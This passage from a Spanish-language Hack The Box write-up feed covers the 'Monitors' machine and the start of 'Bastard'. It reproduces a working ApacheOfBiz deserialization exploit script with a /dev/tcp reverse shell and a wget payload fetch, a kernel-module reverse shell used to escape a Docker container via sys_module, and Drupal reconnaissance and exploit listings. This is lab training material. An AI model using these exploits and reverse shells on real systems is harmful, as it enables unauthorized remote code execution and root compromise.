000000152:   302        0 L      0 W        0 Ch        &quot;common&quot;                                                                                                              
000000242:   302        0 L      0 W        0 Ch        &quot;catalog&quot;                                                                                                             
000000564:   302        0 L      0 W        0 Ch        &quot;marketing&quot;                                                                                                           
000000779:   302        0 L      0 W        0 Ch        &quot;ecommerce&quot;                                                                                                           
000000920:   302        0 L      0 W        0 Ch        &quot;ap&quot;                                                                                                                  
000001128:   302        0 L      0 W        0 Ch        &quot;ar&quot;                                                                                                                  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos varias rutas que nos dan un codigo de estado &lt;code&gt;302 redirect&lt;/code&gt;, y si provamos con la ruta &lt;code&gt;ecommerce&lt;/code&gt;, en el navegador vemos algo relacionado a &lt;code&gt;ofbizsetup&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como sabemos se esta usando el servicio de &lt;code&gt;apache&lt;/code&gt; asi que podemos tratar de buscar vulnerabilidades asociadas a &lt;code&gt;apacheofbiz&lt;/code&gt; y encontramos una de &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit apacheofbiz
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                                                | java/webapps/50178.sh
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Examinamos el &lt;code&gt;exploit&lt;/code&gt; y vemos que aprovecha una vulnerabilidad de serealizacion.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;# Exploit Title: ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments
# Date: 2021-08-04
# Exploit Author: Álvaro Muñoz, Adrián Díaz (s4dbrd)
# Vendor Homepage: https://ofbiz.apache.org/index.html
# Software Link: https://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip
# Version: 17.12.01
# Tested on: Linux

# CVE : CVE-2020-9496

# Step 1: Host HTTP Service with python3 (sudo python3 -m http.server 80)
# Step 2: Start nc listener (Recommended 8001).
# Step 3: Run the exploit.


url='https://127.0.0.1' # CHANGE THIS
port=8443 # CHANGE THIS

function helpPanel(){
    echo -e &quot;\nUsage:&quot;
    echo -e &quot;\t[-i] Attacker's IP&quot;
    echo -e &quot;\t[-p] Attacker's Port&quot;
    echo -e &quot;\t[-h] Show help pannel&quot;
    exit 1
}


function ctrl_c(){
    echo -e &quot;\n\n[!] Exiting...\n&quot;
    exit 1
}
# Ctrl + C
trap ctrl_c INT

function webRequest(){
    echo -e &quot;\n[*] Creating a shell file with bash\n&quot;
    echo -e &quot;#!/bin/bash\n/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/$ip/$ncport 0&amp;gt;&amp;amp;1&quot; &amp;gt; shell.sh
    echo -e &quot;[*] Downloading YsoSerial JAR File\n&quot;
    wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
    echo -e &quot;[*] Generating a JAR payload\n&quot;
    payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 &quot;wget $ip/shell.sh -O /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;)
    echo -e &quot;[*] Sending malicious shell to server...\n&quot; &amp;amp;&amp;amp; sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version='1.0'?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&amp;gt;$payload&amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H 'Content-Type:application/xml' &amp;amp;&amp;gt;/dev/null
    echo -e &quot;[*] Generating a second JAR payload&quot;
    payload2=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 &quot;bash /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;)
    echo -e &quot;\n[*] Executing the payload in the server...\n&quot; &amp;amp;&amp;amp; sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version='1.0'?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&amp;gt;$payload2&amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H 'Content-Type:application/xml' &amp;amp;&amp;gt;/dev/null
    echo -e &quot;\n[*]Deleting Files...&quot;
    rm ysoserial-master-d367e379d9-1.jar &amp;amp;&amp;amp; rm shell.sh
}

declare -i parameter_enable=0; while getopts &quot;:i:p:h:&quot; arg; do
    case $arg in
        i) ip=$OPTARG; let parameter_enable+=1;;
        p) ncport=$OPTARG; let parameter_enable+=1;;
        h) helpPanel;;
    esac
done

if [ $parameter_enable -ne 2 ]; then
    helpPanel
else
    webRequest
fi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;exploit&lt;/code&gt; nos pide como parametros nuestra ip de atacante y un puerto especifico.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ bash ofbiz.sh

Usage:
	[-i] Attacker's IP
	[-p] Attacker's Port
	[-h] Show help pannel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos compartimos un servicio web con &lt;code&gt;python3&lt;/code&gt; ya que el &lt;code&gt;exploit&lt;/code&gt; hara una petición a nuestra maquina solicitando un archivo de nombre &lt;code&gt;shell.sh&lt;/code&gt; el cual previamente creara y con el cual nos devolvera una conexion al puerto que le especificamos. Seguidamente nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; y lanzamos el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ bash ofbiz.sh -i 10.10.16.3 -p 443

[*] Creating a shell file with bash

[*] Downloading YsoSerial JAR File

[*] Generating a JAR payload

[*] Sending malicious shell to server...

[*] Generating a second JAR payload

[*] Executing the payload in the server...


[*]Deleting Files...
❯ cat ofbiz.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.238 - - [14/May/2023 22:43:38] &quot;GET /shell.sh HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y ganamos acceso, pero a un contenedor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:40592.
bash: cannot set terminal process group (32): Inappropriate ioctl for device
bash: no job control in this shell
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# whoami
whoami
root
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# hostname -I
hostname -I
172.17.0.2 
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Haremos el mismo proceso anterior para obtener una &lt;code&gt;tty full interactive&lt;/code&gt;. Lo siguiente que haremos sera descargarnos el &lt;code&gt;linpeas.sh&lt;/code&gt; del repositorio de &lt;code&gt;carlospolop&lt;/code&gt; y subirlo al contenedor para buscar formas potenciales de elevar nuestro privilegio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# wget http://10.10.16.3/linpeas.sh
--2023-05-14 22:54:08--  http://10.10.16.3/linpeas.sh
Connecting to 10.10.16.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 835306 (816K) [text/x-sh]
Saving to: ‘linpeas.sh’
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Le damos permiso al archivo y lo ejecutamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# chmod +x linpeas.sh 
root@b097fc57960e:/tmp# ./linpeas.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de esperar a que nos haga un reconocimento, nos reporta algo potencial referente a una capability &lt;code&gt;sys_module&lt;/code&gt; con la cual podemos convertirnos en &lt;code&gt;root&lt;/code&gt; en la maquina real.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;╔══════════╣ Container Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si quieres saber mas al respecto puedes guiarte de este articulo.&lt;/p&gt;

&lt;p&gt;*&lt;a href=&quot;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&quot;&gt;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lo primero que debemos hacer es crear un archivo &lt;code&gt;reverse-shell.c&lt;/code&gt; con un contenido especifico, donde podemos cambiar la &lt;code&gt;ip y puerto&lt;/code&gt; en el cual deseamos recibir la conexión, en este caso yo realizare la conexión en la interface &lt;code&gt;docker&lt;/code&gt; del usuario &lt;code&gt;marcus&lt;/code&gt; la cual corresponde a la &lt;code&gt;172.17.0.1&lt;/code&gt; y en cuanto al puerto usare el que esta por defecto &lt;code&gt;4444&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#include &amp;lt;linux/kmod.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;AttackDefense&quot;);
MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);
MODULE_VERSION(&quot;1.0&quot;);
char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.1/4444 0&amp;gt;&amp;amp;1&quot;, NULL};
static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO &quot;Exiting\n&quot;);
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente crearemos un archivo &lt;code&gt;makefile&lt;/code&gt; con otro contenido especifico.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;obj-m +=reverse-shell.o
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues ejecutaremos un &lt;code&gt;make&lt;/code&gt; para compilarlo, este nos creara un archivo &lt;code&gt;.ko&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# make
make -C /lib/modules/4.15.0-151-generic/build M=/tmp modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-151-generic'
  CC [M]  /tmp/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/reverse-shell.mod.o
  LD [M]  /tmp/reverse-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-151-generic'
root@b097fc57960e:/tmp# ls
Makefile		      gradle2795579439185181258.bin  gradle6644211106987001499.bin  gradle9039635524913268865.bin  hsperfdata_root  reverse-shell.ko	 shell.sh
Module.symvers		      gradle2983053951583899525.bin  gradle7006611085073049553.bin  gradle9084471384540617701.bin  linpeas.sh	    reverse-shell.mod.c
gradle1338051207622881975.bin  gradle3783653524079408204.bin  gradle7211342044412775236.bin  gradle9170701421662864177.bin  modules.order    reverse-shell.mod.o
gradle251280844494394051.bin   gradle4550055017114582402.bin  gradle8316659095765584843.bin  gradle984417515461424419.bin   reverse-shell.c  reverse-shell.o
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;finalmente debemos ponernos en escucha en el puerto especifico con &lt;code&gt;ncat&lt;/code&gt; y ejecutar el &lt;code&gt;reverse-shell.ko&lt;/code&gt; con &lt;code&gt;insmod&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# insmod reverse-shell.ko 
root@b097fc57960e:/tmp#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y recibimos la conexión como &lt;code&gt;root&lt;/code&gt; en la maquina real.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@monitors:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.10.238 36840 received!
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# whoami
whoami
root
root@monitors:/# hostname -I
hostname -I
10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que nos queda ahora es ir al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; 😄.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@monitors:/# cd /root
cd /root
root@monitors:/root# cat root.txt
cat root.txt
9f3208a5ff66eb9a612aaba91ea35eae
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Sun, 14 May 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Monitors</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Monitors</guid>
        
        <category>Information Leaked</category>
        
        <category>Wordpress Plugin Explotation</category>
        
        <category>LFI</category>
        
        <category>Cacti Explotation</category>
        
        <category>Deserialization Attack</category>
        
        <category>Docker Breakout</category>
        
        <category>capability sysmodule</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Bastard - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina Bastard de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de &lt;code&gt;Drupal&lt;/code&gt; con la que obtendremos ejecución remota de comandos - &lt;code&gt;esto lo haremos de maneras alternativas&lt;/code&gt;, despues una vez tengamos acceso al sistema usaremos la herramienta &lt;code&gt;sherlock&lt;/code&gt; para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un &lt;code&gt;exploit&lt;/code&gt; con el que nos permita elevar nuestro privilegio para convertirmos en el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Bastard
❯ ls
 Bastard
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.9
PING 10.10.10.9 (10.10.10.9) 56(84) bytes of data.
64 bytes from 10.10.10.9: icmp_seq=1 ttl=127 time=123 ms

--- 10.10.10.9 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 123.143/123.143/123.143/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemoscon el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.9 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:54 GMT
Initiating SYN Stealth Scan at 00:54
Scanning 10.10.10.9 [65535 ports]
Discovered open port 135/tcp on 10.10.10.9
Discovered open port 80/tcp on 10.10.10.9
Discovered open port 49154/tcp on 10.10.10.9
Completed SYN Stealth Scan at 00:54, 26.61s elapsed (65535 total ports)
Nmap scan report for 10.10.10.9
Host is up, received user-set (0.13s latency).
Scanned at 2023-04-29 00:54:22 GMT for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 127
135/tcp   open  msrpc   syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.71 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 23 (1.012KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  &lt;code&gt;80 http&lt;/code&gt; , &lt;code&gt;135 rpc&lt;/code&gt; y &lt;code&gt;49154 rpc&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80,135,49154 10.10.10.9 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:55 GMT
Nmap scan report for 10.10.10.9
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.71 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;Microsoft IIS httpd 7.5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;49154&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Primeramente ya que &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;80&lt;/code&gt; se encuentra abierto usaremos &lt;code&gt;whatweb&lt;/code&gt; para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.9
http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a un &lt;code&gt;Drupal 7&lt;/code&gt;, ademas vemos que esta desarrollado en &lt;code&gt;PHP&lt;/code&gt; y &lt;code&gt;ASP.NET&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Drupal: Drupal es un sistema de gestión de contenidos o CMS libre, modular, multipropósito y muy configurable que permite publicar artículos, imágenes, archivos y que también ofrece la posibilidad de otros servicios añadidos como foros, encuestas, votaciones, blogs, administración de usuarios y permisos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos a proceder a abrir el servicio web en el navegador&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como concretamente vimos que la version de &lt;code&gt;drupal&lt;/code&gt; que esta utilizando corresponde a la version &lt;code&gt;7&lt;/code&gt;, podemos tratar de buscar &lt;code&gt;vulnerablidades&lt;/code&gt; asociadas a esta versión. Para ello usaremos &lt;code&gt;searchsploit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit drupal 7.x
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.x Module Services - Remote Code Execution                                                                                                   | php/webapps/41564.php
Drupal &amp;lt; 7.34 - Denial of Service                                                                                                                    | php/dos/35415.txt
Drupal &amp;lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                             | php/webapps/44557.rb
Drupal &amp;lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                          | php/webapps/44542.txt
Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
Drupal &amp;lt; 8.5.11 / &amp;lt; 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                | php/remote/46510.rb
Drupal &amp;lt; 8.6.10 / &amp;lt; 8.5.11 - REST Module Remote Code Execution                                                                                       | php/webapps/46452.txt
Drupal &amp;lt; 8.6.9 - REST Module Remote Code Execution                                                                                                   | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                    | php/webapps/44501.txt
Drupal Module CKEditor &amp;lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                               | php/webapps/25493.txt
Drupal Module Coder &amp;lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                        | php/remote/40144.php
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                    | php/remote/40130.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

